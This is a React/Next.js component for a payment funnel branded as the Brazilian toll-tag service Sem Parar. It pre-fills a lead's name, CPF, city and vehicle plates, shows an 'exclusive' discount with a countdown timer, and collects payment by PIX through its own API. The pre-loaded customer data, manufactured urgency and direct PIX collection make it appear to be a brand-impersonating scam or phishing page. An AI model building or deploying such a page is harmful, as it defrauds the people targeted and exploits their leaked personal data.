'use client';

import { useState, useEffect } from 'react';
import Image from 'next/image';

interface LeadData {
  nrc: number;
  nome: string;
  firstName: string;
  email: string;
  cpf: string;
  cidade: string;
  estado: string;
  placas: string[];
  tags: string[];
  planos: string[];
  qtdVeiculos: number;
  situacao: number;
}

interface PixData {
  id: string;
  qrCodeBase64: string;
  copyPaste: string;
  amount: number;
  expiresAt: string;
}

export default function FunnelClient({ lead }: { lead: LeadData }) {
  const [step, setStep] = useState<'offer' | 'checkout' | 'pix' | 'success'>('offer');
  const [copied, setCopied] = useState(false);
  const [loading, setLoading] = useState(false);
  const [pixData, setPixData] = useState<PixData | null>(null);
  const [paymentStatus, setPaymentStatus] = useState<'pending' | 'paid'>('pending');
  const [countdown, setCountdown] = useState({ minutes: 14, seconds: 59 });
  const [formData, setFormData] = useState({
    name: lead.nome || '',
    email: lead.email || '',
    cpf: lead.cpf || '',
  });

  const promoPrice = 29.90;
  const regularPrice = 49.90;
  const discount = Math.round((1 - promoPrice / regularPrice) * 100);
  const economy = (regularPrice - promoPrice) * 12 + 40 + 24.90;

  // Countdown timer
  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev.seconds > 0) {
          return { ...prev, seconds: prev.seconds - 1 };
        } else if (prev.minutes > 0) {
          return { minutes: prev.minutes - 1, seconds: 59 };
        }
        return prev;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const handleCopyPix = () => {
    if (pixData?.copyPaste) {
      navigator.clipboard.writeText(pixData.copyPaste);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  const generatePix = async () => {
    if (!formData.name || !formData.email || !formData.cpf) {
      return;
    }

    setLoading(true);
    try {
      const response = await fetch('/api/pix', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          nrc: lead.nrc,
          name: formData.name,
          email: formData.email,
          cpf: formData.cpf,
          amount: promoPrice,
        }),
      });

      if (!response.ok) throw new Error('Falha ao gerar PIX');

      const pix = await response.json();
      setPixData(pix);
      setStep('pix');
    } catch (error) {
      alert('Erro ao gerar PIX. Tente novamente.');
      console.error(error);
    } finally {
      setLoading(false);
    }
  };

  // Check payment status
  useEffect(() => {
    if (!pixData?.id || paymentStatus !== 'pending') return;

    const checkStatus = async () => {
      try {
        const response = await fetch(`/api/pix?id=${pixData.id}`);
        const data = await response.json();
        if (data.status === 'paid' || data.status === 'approved' || data.status === 'completed') {
          setPaymentStatus('paid');
          setStep('success');
        }
      } catch (error) {
        console.error('Error checking payment:', error);
      }
    };

    const interval = setInterval(checkStatus, 5000);
    return () => clearInterval(interval);
  }, [pixData?.id, paymentStatus]);

  return (
    <div className="min-h-screen bg-[#fafafa]">
      {/* Header fixo */}
      <header className="bg-white border-b border-[#eee] sticky top-0 z-50">
        <div className="max-w-[1200px] mx-auto px-4 py-3 flex items-center justify-between">
          <Image src="/logo.png" alt="Sem Parar" width={100} height={28} className="h-7 w-auto" />
          {step === 'offer' && (
            <div className="flex items-center gap-2 bg-[#fff3f3] text-[#d60b52] px-3 py-1.5 rounded-full text-sm font-medium">
              <span className="w-2 h-2 bg-[#d60b52] rounded-full animate-pulse"></span>
              Oferta expira em {String(countdown.minutes).padStart(2, '0')}:{String(countdown.seconds).padStart(2, '0')}
            </div>
          )}
        </div>
      </header>

      {/* STEP: OFFER */}
      {step === 'offer' && (
        <>
          {/* Hero Section */}
          <section className="bg-gradient-to-b from-[#d60b52] to-[#a50840] text-white">
            <div className="max-w-[800px] mx-auto px-4 py-8 sm:py-12 text-center">
              <div className="inline-flex items-center gap-2 bg-white/20 backdrop-blur px-4 py-2 rounded-full text-sm mb-6">
                <span className="w-2 h-2 bg-[#4ade80] rounded-full"></span>
                <span>Oferta liberada para {lead.firstName}</span>
              </div>

              <h1 className="text-3xl sm:text-5xl font-bold mb-4 leading-tight">
                Voce ganhou {discount}% de desconto<br />na sua TAG Sem Parar
              </h1>

              <p className="text-white/80 text-lg mb-8 max-w-lg mx-auto">
                Oferta exclusiva para clientes selecionados. Valida apenas hoje.
              </p>

              <div className="bg-white rounded-2xl p-6 sm:p-8 text-[#0e0d0d] max-w-md mx-auto shadow-2xl">
                <div className="flex items-center justify-center gap-3 mb-4">
                  <span className="text-[#999] line-through text-xl">R$ {regularPrice.toFixed(2).replace('.', ',')}</span>
                  <span className="bg-[#d60b52] text-white text-sm font-bold px-3 py-1 rounded-full">-{discount}%</span>
                </div>
                <div className="text-5xl sm:text-6xl font-bold text-[#d60b52] mb-2">
                  R$ {promoPrice.toFixed(2).replace('.', ',')}
                  <span className="text-xl font-normal text-[#666]">/mes</span>
                </div>
                <p className="text-[#666] text-sm">Economia de R$ {economy.toFixed(2).replace('.', ',')} no primeiro ano</p>
              </div>
            </div>
          </section>

          {/* O que voce ganha */}
          <section className="bg-white py-10">
            <div className="max-w-[800px] mx-auto px-4">
              <h2 className="text-center text-xl font-bold text-[#0e0d0d] mb-8">
                O que voce leva por R$ {promoPrice.toFixed(2).replace('.', ',')}/mes
              </h2>

              <div className="grid sm:grid-cols-2 gap-4 mb-8">
                {[
                  { icon: '🛣️', title: 'Pedagios em todo Brasil', desc: '100% das rodovias cobertas' },
                  { icon: '🛒', title: 'Estacionamentos', desc: 'Shoppings, aeroportos, hospitais' },
                  { icon: '⛽', title: 'Postos de combustivel', desc: 'Pague abastecimento com a TAG' },
                  { icon: '🍔', title: 'Drive-thrus', desc: "McDonald's, Burger King e mais" },
                ].map((item, i) => (
                  <div key={i} className="flex items-start gap-4 p-4 bg-[#f8f8f8] rounded-xl">
                    <span className="text-3xl">{item.icon}</span>
                    <div>
                      <p className="font-semibold text-[#0e0d0d]">{item.title}</p>
                      <p className="text-sm text-[#666]">{item.desc}</p>
                    </div>
                  </div>
                ))}
              </div>

              {/* Bonus */}
              <div className="bg-[#f0fdf4] border border-[#86efac] rounded-xl p-5 mb-8">
                <div className="flex items-start gap-4">
                  <span className="text-3xl">🎁</span>
                  <div>
                    <p className="font-bold text-[#166534] mb-1">Bonus exclusivos inclusos</p>
                    <div className="flex flex-wrap gap-3 text-sm">
                      <span className="bg-white text-[#166534] px-3 py-1 rounded-full">✓ Adesao gratis (R$40)</span>
                      <span className="bg-white text-[#166534] px-3 py-1 rounded-full">✓ Frete gratis (R$25)</span>
                      <span className="bg-white text-[#166534] px-3 py-1 rounded-full">✓ Sem fidelidade</span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </section>

          {/* Prova social */}
          <section className="bg-[#f8f8f8] py-8 border-y border-[#eee]">
            <div className="max-w-[800px] mx-auto px-4">
              <div className="flex items-center justify-center gap-8 flex-wrap text-center">
                <div>
                  <p className="text-2xl font-bold text-[#0e0d0d]">+8 milhoes</p>
                  <p className="text-sm text-[#666]">de clientes</p>
                </div>
                <div className="w-px h-10 bg-[#ddd] hidden sm:block"></div>
                <div>
                  <p className="text-2xl font-bold text-[#0e0d0d]">4.7 ★</p>
                  <p className="text-sm text-[#666]">na App Store</p>
                </div>
                <div className="w-px h-10 bg-[#ddd] hidden sm:block"></div>
                <div>
                  <p className="text-2xl font-bold text-[#0e0d0d]">100%</p>
                  <p className="text-sm text-[#666]">das rodovias</p>
                </div>
              </div>
            </div>
          </section>

          {/* CTA Final */}
          <section className="bg-white py-10">
            <div className="max-w-[500px] mx-auto px-4 text-center">
              <p className="text-[#666] text-sm mb-4">
                Oferta exclusiva para <strong>{lead.firstName}</strong> · {lead.cidade}/{lead.estado}
              </p>

              <button
                onClick={() => setStep('checkout')}
                className="w-full bg-[#d60b52] hover:bg-[#b20944] text-white font-bold text-lg py-5 rounded-xl transition-all transform hover:scale-[1.02] shadow-lg shadow-[#d60b52]/30 mb-4"
              >
                Quero minha TAG por R$ {promoPrice.toFixed(2).replace('.', ',')}/mes
              </button>

              <p className="text-[#999] text-xs flex items-center justify-center gap-2">
                <span>🔒</span> Pagamento seguro · Cancele quando quiser
              </p>
            </div>
          </section>

          {/* FAQ minimo */}
          <section className="bg-[#f8f8f8] py-8">
            <div className="max-w-[600px] mx-auto px-4">
              <details className="bg-white rounded-xl mb-2">
                <summary className="p-4 cursor-pointer font-medium text-[#0e0d0d]">Tem fidelidade ou multa?</summary>
                <p className="px-4 pb-4 text-sm text-[#666]">Nao! Voce pode cancelar quando quiser, sem multas ou taxas.</p>
              </details>
              <details className="bg-white rounded-xl mb-2">
                <summary className="p-4 cursor-pointer font-medium text-[#0e0d0d]">Como recebo a TAG?</summary>
                <p className="px-4 pb-4 text-sm text-[#666]">Enviamos pelos Correios para seu endereco. Chega em 5-7 dias uteis.</p>
              </details>
              <details className="bg-white rounded-xl">
                <summary className="p-4 cursor-pointer font-medium text-[#0e0d0d]">Funciona em todo Brasil?</summary>
                <p className="px-4 pb-4 text-sm text-[#666]">Sim! 100% das rodovias pedagiadas, shoppings, estacionamentos e postos.</p>
              </details>
            </div>
          </section>
        </>
      )}

      {/* STEP: CHECKOUT */}
      {step === 'checkout' && (
        <main className="max-w-[500px] mx-auto px-4 py-8">
          <button onClick={() => setStep('offer')} className="text-[#666] text-sm mb-6 hover:text-[#0e0d0d]">
            ← Voltar
          </button>

          <div className="bg-white rounded-2xl p-6 shadow-sm border border-[#eee] mb-6">
            <h1 className="text-xl font-bold text-[#0e0d0d] mb-1">Finalizar pedido</h1>
            <p className="text-[#666] text-sm mb-6">Preencha seus dados para gerar o PIX</p>

            <div className="space-y-4 mb-6">
              <div>
                <label className="block text-[#0e0d0d] text-sm font-medium mb-2">Nome completo</label>
                <input
                  type="text"
                  value={formData.name}
                  onChange={(e) => setFormData({ ...formData, name: e.target.value })}
                  className="w-full border border-[#ddd] rounded-xl px-4 py-3.5 text-[#0e0d0d] focus:outline-none focus:border-[#d60b52] focus:ring-2 focus:ring-[#d60b52]/20"
                  placeholder="Seu nome completo"
                />
              </div>
              <div>
                <label className="block text-[#0e0d0d] text-sm font-medium mb-2">E-mail</label>
                <input
                  type="email"
                  value={formData.email}
                  onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                  className="w-full border border-[#ddd] rounded-xl px-4 py-3.5 text-[#0e0d0d] focus:outline-none focus:border-[#d60b52] focus:ring-2 focus:ring-[#d60b52]/20"
                  placeholder="seu@email.com"
                />
              </div>
              <div>
                <label className="block text-[#0e0d0d] text-sm font-medium mb-2">CPF</label>
                <input
                  type="text"
                  value={formData.cpf}
                  onChange={(e) => setFormData({ ...formData, cpf: e.target.value })}
                  className="w-full border border-[#ddd] rounded-xl px-4 py-3.5 text-[#0e0d0d] focus:outline-none focus:border-[#d60b52] focus:ring-2 focus:ring-[#d60b52]/20"
                  placeholder="000.000.000-00"
                />
              </div>
            </div>

            <div className="bg-[#f8f8f8] rounded-xl p-4 mb-6">
              <div className="flex justify-between mb-2">
                <span className="text-[#666]">TAG Sem Parar</span>
                <span className="text-[#0e0d0d]">R$ {promoPrice.toFixed(2).replace('.', ',')}/mes</span>
              </div>
              <div className="flex justify-between mb-2">
                <span className="text-[#666]">Adesao</span>
                <span className="text-[#16a34a]">Gratis</span>
              </div>
              <div className="flex justify-between">
                <span className="text-[#666]">Frete</span>
                <span className="text-[#16a34a]">Gratis</span>
              </div>
              <div className="border-t border-[#ddd] mt-4 pt-4 flex justify-between">
                <span className="font-bold text-[#0e0d0d]">Total hoje</span>
                <span className="font-bold text-[#d60b52] text-xl">R$ {promoPrice.toFixed(2).replace('.', ',')}</span>
              </div>
            </div>

            <button
              onClick={generatePix}
              disabled={loading || !formData.name || !formData.email || !formData.cpf}
              className="w-full bg-[#d60b52] hover:bg-[#b20944] text-white font-bold text-lg py-4 rounded-xl transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {loading ? 'Gerando PIX...' : 'Gerar PIX'}
            </button>
          </div>

          <p className="text-center text-[#999] text-xs">
            🔒 Seus dados estao seguros e protegidos
          </p>
        </main>
      )}

      {/* STEP: PIX */}
      {step === 'pix' && (
        <main className="max-w-[500px] mx-auto px-4 py-8">
          <div className="bg-white rounded-2xl p-6 shadow-sm border border-[#eee] text-center">
            <div className="inline-flex items-center gap-2 bg-[#fef3c7] text-[#92400e] px-4 py-2 rounded-full text-sm font-medium mb-6">
              <span className="w-2 h-2 bg-[#f59e0b] rounded-full animate-pulse"></span>
              Aguardando pagamento
            </div>

            <h1 className="text-xl font-bold text-[#0e0d0d] mb-2">Pague com PIX</h1>
            <p className="text-[#666] text-sm mb-6">Escaneie o QR Code ou copie o codigo</p>

            <div className="bg-[#f8f8f8] rounded-2xl p-6 mb-6 inline-block">
              {pixData?.qrCodeBase64 ? (
                <img src={`data:image/png;base64,${pixData.qrCodeBase64}`} alt="QR Code PIX" className="w-52 h-52" />
              ) : (
                <div className="w-52 h-52 bg-[#eee] rounded-xl flex items-center justify-center">
                  <span className="text-[#999]">QR Code</span>
                </div>
              )}
            </div>

            <div className="text-3xl font-bold text-[#d60b52] mb-6">
              R$ {promoPrice.toFixed(2).replace('.', ',')}
            </div>

            <div className="bg-[#f8f8f8] rounded-xl p-4 mb-6">
              <p className="text-[#666] text-xs mb-2">PIX Copia e Cola</p>
              <div className="flex gap-2">
                <code className="flex-1 text-[#0e0d0d] text-xs bg-white border border-[#ddd] rounded-lg p-3 text-left truncate">
                  {pixData?.copyPaste || 'Gerando...'}
                </code>
                <button
                  onClick={handleCopyPix}
                  className="bg-[#0e0d0d] hover:bg-[#333] text-white font-semibold px-4 py-2 rounded-lg transition-colors text-sm"
                >
                  {copied ? '✓' : 'Copiar'}
                </button>
              </div>
            </div>

            <div className="flex items-center justify-center gap-2 text-[#666] text-sm">
              <div className="w-2 h-2 bg-[#f59e0b] rounded-full animate-pulse"></div>
              O pagamento e confirmado automaticamente
            </div>
          </div>

          <button onClick={() => setStep('checkout')} className="w-full text-[#666] text-sm py-4 hover:text-[#0e0d0d]">
            ← Voltar e alterar dados
          </button>
        </main>
      )}

      {/* STEP: SUCCESS */}
      {step === 'success' && (
        <main className="max-w-[500px] mx-auto px-4 py-12 text-center">
          <div className="text-6xl mb-6">🎉</div>
          <h1 className="text-2xl font-bold text-[#0e0d0d] mb-2">Pagamento confirmado!</h1>
          <p className="text-[#666] mb-8">
            Obrigado, {lead.firstName}! Sua TAG sera enviada para o endereco cadastrado.
          </p>

          <div className="bg-[#f0fdf4] border border-[#86efac] rounded-xl p-6 mb-6 text-left">
            <p className="text-[#166534] font-semibold mb-2">Proximos passos:</p>
            <ul className="text-[#166534] text-sm space-y-2">
              <li>✓ Voce recebera um e-mail com os detalhes</li>
              <li>✓ Sua TAG chegara em 5-7 dias uteis</li>
              <li>✓ Baixe o app Sem Parar para acompanhar</li>
            </ul>
          </div>

          <p className="text-[#999] text-xs">Codigo do pedido: #{lead.nrc}</p>
        </main>
      )}

      {/* Footer */}
      <footer className="bg-white border-t border-[#eee] py-6 mt-auto">
        <div className="max-w-[800px] mx-auto px-4 text-center">
          <Image src="/logo.png" alt="Sem Parar" width={80} height={24} className="h-5 w-auto mx-auto mb-3 opacity-40" />
          <p className="text-[#999] text-xs">
            DBTrans Internet Ltda. · CNPJ 10.558.633/0001-61
          </p>
        </div>
      </footer>
    </div>
  );
}
